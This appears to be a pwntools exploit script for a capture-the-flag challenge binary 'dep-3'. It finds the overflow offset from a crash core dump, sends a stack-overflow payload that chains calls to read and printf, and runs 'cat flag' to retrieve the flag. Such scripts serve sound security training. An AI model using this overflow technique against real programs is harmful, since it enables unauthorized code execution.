from pwn import *
import os

DEBUG = False 
file = "./dep-3"
os.symlink("./flag", "./a.txt")
elf = ELF(file)
env = {} 

# crash the process to get a core file and find the buffer address (still boilerplate)

io = process(file, env=env, setuid=False)
io.sendline(cyclic(10000)) 
io.wait()
core = io.corefile
buffer_address = core.stack.find(cyclic(50))
max_len = cyclic(100).find(p32(core.eip))

os.unlink(core.path) 

max_len = cyclic(1000).find(p32(core.eip))

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b input_func
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

some_function_addr = elf.symbols["some_function"]
read_addr = elf.symbols["read"]
printf_addr = elf.symbols["printf"]
payload = b"A" * max_len + p32(some_function_addr) + p32(read_addr) + p32(printf_addr) + p32(0x3) + p32(buffer_address) + p32(max_len)

io.send(payload)

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

# import re
io.sendlineafter(b'!', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
os.unlink("./a.txt")
